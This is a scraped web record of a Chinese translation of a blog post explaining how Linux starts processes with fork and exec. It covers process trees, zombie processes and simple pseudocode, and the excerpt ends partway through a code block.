{"url_object_id": "163e3c6dadc221edbe975926bad55ee5", "title": "当你在 Linux 上启动一个进程时会发生什么？", "url": "http://blog.jobbole.com/113506/", "create_date": "2018/01/20", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2015/10/9aeba2223d66a3c6692233694383abce.jpg"], "praise_nums": 1, "comment_nums": 0, "favor_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://jvns.ca/blog/2016/10/04/exec-will-eat-your-brain/\">Julia Evans</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9256-1.html\">Linux中国/jessie-pang</a>   </div><p>本文是关于 fork 和 exec 是如何在 Unix 上工作的。你或许已经知道，也有人还不知道。几年前当我了解到这些时，我惊叹不已。</p>\n<p>我们要做的是启动一个进程。我们已经在博客上讨论了很多关于<strong>系统调用</strong>的问题，每当你启动一个进程或者打开一个文件，这都是一个系统调用。所以你可能会认为有这样的系统调用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634bcc1f17c327255927\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstart_process([\"ls\", \"-l\", \"my_cool_directory\"])\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f17c327255927-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f17c327255927-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634bcc1f17c327255927-1\"><span class=\"crayon-e\">start_process</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">\"ls\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"-l\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"my_cool_directory\"</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f17c327255927-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这是一个合理的想法，显然这是它在 DOS 或 Windows 中的工作原理。我想说的是，这并不是 Linux 上的工作原理。但是，我查阅了文档，确实有一个 <a href=\"http://man7.org/linux/man-pages/man3/posix_spawn.3.html\">posix_spawn</a> 的系统调用基本上是这样做的，不过这不在本文的讨论范围内。</p>\n<h3 id=\"toc_1\">fork 和 exec</h3>\n<p>Linux 上的 <code>posix_spawn</code> 是通过两个系统调用实现的，分别是 <code>fork</code> 和 <code>exec</code>（实际上是 <code>execve</code>），这些都是人们常常使用的。尽管在 OS X 上，人们使用 <code>posix_spawn</code>，而 <code>fork</code> 和 <code>exec</code> 是不提倡的，但我们将讨论的是 Linux。</p>\n<p>Linux 中的每个进程都存在于“进程树”中。你可以通过运行 <code>pstree</code> 命令查看进程树。树的根是 <code>init</code>，进程号是 1。每个进程（<code>init</code> 除外）都有一个父进程，一个进程都可以有很多子进程。</p>\n<p>所以，假设我要启动一个名为 <code>ls</code> 的进程来列出一个目录。我是不是只要发起一个进程 <code>ls</code> 就好了呢？不是的。</p>\n<p>我要做的是，创建一个子进程，这个子进程是我（<code>me</code>）本身的一个克隆，然后这个子进程的“脑子”被吃掉了，变成 <code>ls</code>。</p>\n<p>开始是这样的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634bcc1f186047830720\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmy parent\r\n    |- me\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f186047830720-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f186047830720-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f186047830720-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634bcc1f186047830720-1\"><span class=\"crayon-e\">my </span><span class=\"crayon-r\">parent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f186047830720-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">me</span></div><div class=\"crayon-line\" id=\"crayon-5a634bcc1f186047830720-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>然后运行 <code>fork()</code>，生成一个子进程，是我（<code>me</code>）自己的一份克隆：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634bcc1f18a067506010\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmy parent\r\n    |- me\r\n       |-- clone of me\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f18a067506010-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f18a067506010-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f18a067506010-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f18a067506010-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634bcc1f18a067506010-1\"><span class=\"crayon-e\">my </span><span class=\"crayon-r\">parent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f18a067506010-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">me</span></div><div class=\"crayon-line\" id=\"crayon-5a634bcc1f18a067506010-3\"><span class=\"crayon-h\">       </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">of </span><span class=\"crayon-i\">me</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f18a067506010-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>然后我让该子进程运行 <code>exec(\"ls\")</code>，变成这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634bcc1f18e844432686\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmy parent\r\n    |- me\r\n       |-- ls\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f18e844432686-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f18e844432686-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f18e844432686-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f18e844432686-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634bcc1f18e844432686-1\"><span class=\"crayon-e\">my </span><span class=\"crayon-r\">parent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f18e844432686-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">me</span></div><div class=\"crayon-line\" id=\"crayon-5a634bcc1f18e844432686-3\"><span class=\"crayon-h\">       </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f18e844432686-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p>当 ls 命令结束后，我几乎又变回了我自己：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634bcc1f192304628400\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmy parent\r\n    |- me\r\n       |-- ls (zombie)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f192304628400-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f192304628400-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f192304628400-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f192304628400-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634bcc1f192304628400-1\"><span class=\"crayon-e\">my </span><span class=\"crayon-r\">parent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f192304628400-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">me</span></div><div class=\"crayon-line\" id=\"crayon-5a634bcc1f192304628400-3\"><span class=\"crayon-h\">       </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">zombie</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f192304628400-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>在这时 <code>ls</code> 其实是一个僵尸进程。这意味着它已经死了，但它还在等我，以防我需要检查它的返回值（使用 <code>wait</code> 系统调用）。一旦我获得了它的返回值，我将再次恢复独自一人的状态。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634bcc1f195524553413\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmy parent\r\n    |- me\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f195524553413-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f195524553413-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f195524553413-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634bcc1f195524553413-1\"><span class=\"crayon-e\">my </span><span class=\"crayon-r\">parent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f195524553413-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">me</span></div><div class=\"crayon-line\" id=\"crayon-5a634bcc1f195524553413-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">fork 和 exec 的代码实现</h3>\n<p>如果你要编写一个 shell，这是你必须做的一个练习（这是一个非常有趣和有启发性的项目。Kamal 在 Github 上有一个很棒的研讨会：<a href=\"https://github.com/kamalmarhubi/shell-workshop\">https://github.com/kamalmarhubi/shell-workshop</a>）。</p>\n<p>事实证明，有了 C 或 Python 的技能，你可以在几个小时内编写一个非常简单的 shell，像 bash 一样。（至少如果你旁边能有个人多少懂一点，如果没有的话用时会久一点。）我已经完成啦，真的很棒。</p>\n<p>这就是 <code>fork</code> 和 <code>exec</code> 在程序中的实现。我写了一段 C 的伪代码。请记住，<a href=\"https://rachelbythebay.com/w/2014/08/19/fork/\">fork 也可能会失败哦。</a></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634bcc1f199463133081\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nint pid = fork();\r\n// 我要分身啦\r\n// “我”是谁呢？可能是子进程也可能是父进程\r\nif (pid == 0) {\r\n    // 我现在是子进程\r\n    // “ls” 吃掉了我脑子，然后变成一个完全不一样的进程\r\n    exec([\"ls\"])\r\n} else if (pid == -1) {\r\n    // 天啊，fork 失败了，简直是灾难！\r\n} else {\r\n    // 我是父进程耶\r\n    // 继续做一个酷酷的美男子吧\r\n    // 需要的话，我可以等待子进程结束\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f199463133081-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f199463133081-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f199463133081-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f199463133081-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f199463133081-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f199463133081-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f199463133081-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f199463133081-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f199463133081-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f199463133081-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f199463133081-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f199463133081-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f199463133081-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634bcc1f199463133081-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634bcc1f199463133081-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634bcc1f199463133081-1\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fork</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f199463133081-2\"><span class=\"crayon-c\">// 我要分身啦</span></div><div class=\"crayon-line\" id=\"crayon-5a634bcc1f199463133081-3\"><span class=\"crayon-c\">// “我”是谁呢？可能是子进程也可能是父进程</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634bcc1f199463133081-4\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pid</span><span class=\"crayon-h\"> 